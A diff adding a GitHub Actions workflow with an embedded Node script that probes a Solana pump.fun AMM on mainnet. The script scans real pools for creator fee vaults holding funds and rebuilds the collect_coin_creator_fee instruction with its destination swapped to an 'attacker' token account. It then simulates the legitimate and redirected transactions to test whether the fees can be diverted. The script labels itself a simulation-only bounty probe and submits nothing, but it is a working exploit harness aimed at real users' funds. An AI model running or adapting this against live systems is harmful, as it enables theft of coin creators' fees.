@@ -1,0 +1,67 @@
+name: collect-coin-creator-fee-redirect
+
+on:
+  push:
+    paths:
+      - '.github/workflows/collect-coin-creator-fee-redirect.yml'
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
+      - run: npm install --no-save @pump-fun/pump-sdk@1.36.0 @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js @solana/spl-token
+      - name: Read-only vault selection and simulation-only redirect differential
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import fs from 'node:fs';
+          import {Connection,PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
+          import {NATIVE_MINT,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,getAssociatedTokenAddressSync,createAssociatedTokenAccountIdempotentInstruction} from '@solana/spl-token';
+          import * as s from '@pump-fun/pump-swap-sdk';
+
+          const RPC='https://api.mainnet-beta.solana.com',c=new Connection(RPC,'confirmed');
+          const PAYER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
+          const AMM=new PublicKey('pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA');
+          const idl=JSON.parse(fs.readFileSync('node_modules/@pump-fun/pump-swap-sdk/src/idl/pump_amm.json','utf8'));
+          const collect=idl.instructions.find(x=>x.name==='collect_coin_creator_fee');
+          console.log('IDL_COLLECT',JSON.stringify(collect,null,2));
+          console.log('SDK_METHOD',String(s.PUMP_AMM_SDK.collectCoinCreatorFee).slice(0,20000));
+
+          const pools=['3KFN45igGN2vJ86UTgB4RMJt3A68PHzuvLA6qQ3i7dQ5','3EUib8zfvYmJR5bWBXQFA9tm73NiRNcaFAZB3dGv2p8N','DSV2CUbhfEWRPRn9QRZWkYohRi47WEeauz8s89ekKBdN','2AZvfjn3Hre5mM47bRv6VnKRX36wSDW6vrkC5ykK3X7T'];
+          const online=new s.OnlinePumpAmmSdk(c);
+          function vaultAuthority(creator){return PublicKey.findProgramAddressSync([Buffer.from('creator_vault'),creator.toBuffer()],AMM)[0]}
+          const candidates=[];
+          for(const ps of pools){try{const pk=new PublicKey(ps),pool=await online.fetchPool(pk),quote=pool.quoteMint,creator=pool.coinCreator,auth=vaultAuthority(creator),vault=getAssociatedTokenAddressSync(quote,auth,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID),info=await c.getAccountInfo(vault,'confirmed');let amount=0n;if(info?.data?.length>=72)amount=info.data.readBigUInt64LE(64);candidates.push({pool:ps,base:pool.baseMint.toBase58(),quote:quote.toBase58(),creator:creator.toBase58(),auth:auth.toBase58(),vault:vault.toBase58(),amount:amount.toString(),info})}catch(e){console.log('POOL_FAIL',ps,String(e).slice(0,500))}}
+          console.log('CANDIDATES',JSON.stringify(candidates.map(({info,...x})=>x),null,2));
+          let target=candidates.filter(x=>BigInt(x.amount)>0n).sort((a,b)=>BigInt(a.amount)>BigInt(b.amount)?-1:1)[0];
+          if(!target){
+            console.log('KNOWN_POOLS_EMPTY_SCANNING_PROGRAM');
+            const disc=Buffer.from(idl.accounts.find(x=>x.name==='Pool').discriminator);
+            const rows=await c.getProgramAccounts(AMM,{commitment:'confirmed',filters:[{memcmp:{offset:0,bytes:(await import('bs58')).default.encode(disc)}}]});
+            const creators=[]; const seen=new Set();
+            for(const r of rows){try{const pool=s.PUMP_AMM_SDK.decodePool(r.account);const creator=pool.coinCreator.toBase58(),quote=pool.quoteMint.toBase58();if(quote!==NATIVE_MINT.toBase58()||seen.has(creator))continue;seen.add(creator);creators.push({creator:new PublicKey(creator),pool:r.pubkey,base:pool.baseMint})}catch{}}
+            console.log('UNIQUE_WSOL_CREATORS',creators.length);
+            for(let off=0;off<Math.min(creators.length,5000);off+=100){const batch=creators.slice(off,off+100),atas=batch.map(x=>getAssociatedTokenAddressSync(NATIVE_MINT,vaultAuthority(x.creator),true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID)),infos=await c.getMultipleAccountsInfo(atas,'confirmed');for(let i=0;i<batch.length;i++){const info=infos[i];if(info?.data?.length>=72){const amount=info.data.readBigUInt64LE(64);if(amount>0n){target={pool:batch[i].pool.toBase58(),base:batch[i].base.toBase58(),quote:NATIVE_MINT.toBase58(),creator:batch[i].creator.toBase58(),auth:vaultAuthority(batch[i].creator).toBase58(),vault:atas[i].toBase58(),amount:amount.toString(),info};break}}}if(target)break}
+          }
+          if(!target){console.log('NO_POSITIVE_VAULT_FOUND');process.exit(0)}
+          console.log('TARGET',JSON.stringify(Object.fromEntries(Object.entries(target).filter(([k])=>k!=='info')),null,2));
+          const creator=new PublicKey(target.creator),quote=new PublicKey(target.quote),auth=new PublicKey(target.auth),vault=new PublicKey(target.vault),creatorAta=getAssociatedTokenAddressSync(quote,creator,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID),attackerAta=getAssociatedTokenAddressSync(quote,PAYER,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          const [vaultInfo,creatorAtaInfo,attackerAtaInfo]=await c.getMultipleAccountsInfo([vault,creatorAta,attackerAta],'confirmed');
+          const built=await s.PUMP_AMM_SDK.collectCoinCreatorFee({coinCreator:creator,quoteMint:quote,quoteTokenProgram:TOKEN_PROGRAM_ID,coinCreatorVaultAuthority:auth,coinCreatorVaultAta:vault,coinCreatorTokenAccount:creatorAta,coinCreatorVaultAtaAccountInfo:vaultInfo,coinCreatorTokenAccountInfo:creatorAtaInfo},PAYER);
+          const ixs=Array.isArray(built)?built:[built]; const disc=Buffer.from(collect.discriminator).toString('hex'); const ci=ixs.findIndex(ix=>ix.programId.equals(AMM)&&Buffer.from(ix.data).subarray(0,8).toString('hex')===disc);if(ci<0)throw Error('collect ix not found');const collectIx=ixs[ci];
+          console.log('BUILT',JSON.stringify(ixs.map((ix,i)=>({i,program:ix.programId.toBase58(),data:Buffer.from(ix.data).toString('hex'),keys:ix.keys.map((k,j)=>({j,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable}))})),null,2));
+          const destIdx=collectIx.keys.findIndex(k=>k.pubkey.equals(creatorAta));console.log('DEST_IDX',destIdx,'CREATOR_ATA',creatorAta.toBase58(),'ATTACKER_ATA',attackerAta.toBase58());if(destIdx<0)throw Error('canonical destination not in collect ix');
+          const mutatedKeys=collectIx.keys.map(k=>({...k}));mutatedKeys[destIdx].pubkey=attackerAta;const mutated=new TransactionInstruction({programId:collectIx.programId,keys:mutatedKeys,data:Buffer.from(collectIx.data)});
+          const createAttackerAta=createAssociatedTokenAccountIdempotentInstruction(PAYER,attackerAta,PAYER,quote,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          function tok(a){return a?.data?.length>=72?{lamports:a.lamports,amount:a.data.readBigUInt64LE(64).toString(),owner:new PublicKey(a.data.subarray(32,64)).toBase58(),mint:new PublicKey(a.data.subarray(0,32)).toBase58()}:null}
+          console.log('PRE',JSON.stringify({vault:tok(vaultInfo),creatorAta:tok(creatorAtaInfo),attackerAta:tok(attackerAtaInfo)},null,2));
+          function parse(logs){const t=(logs??[]).join('\n');return {code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,interesting:(logs??[]).filter(x=>/Instruction:|AnchorError|Error Code|Error Number|creator|vault|token|Transfer|failed|success/i.test(x)).slice(-150)}}
+          async function sim(label,seq){const bh=(await c.getLatestBlockhash('processed')).blockhash,tx=new VersionedTransaction(new TransactionMessage({payerKey:PAYER,recentBlockhash:bh,instructions:seq}).compileToV0Message()),raw=Buffer.from(tx.serialize()).toString('base64');const r=await fetch(RPC,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-creator-collect/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'simulateTransaction',params:[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:[vault.toBase58(),creatorAta.toBase58(),attackerAta.toBase58()]}}]})}),j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));const v=j.result.value,e=parse(v.logs),post=(v.accounts??[]).map(a=>a?.data?.[0]?{...a,data:Buffer.from(a.data[0],'base64')}:null);console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,code:e.code,num:e.num,account:e.account,post:{vault:tok(post[0]),creatorAta:tok(post[1]),attackerAta:tok(post[2])},interesting:e.interesting},null,2));return {v,e}}
+          await sim('CONTROL_CANONICAL',ixs);
+          const prefix=ixs.slice(0,ci),suffix=ixs.slice(ci+1);await sim('MUTATE_DEST_TO_ATTACKER',[createAttackerAta,...prefix,mutated,...suffix]);
+          NODE
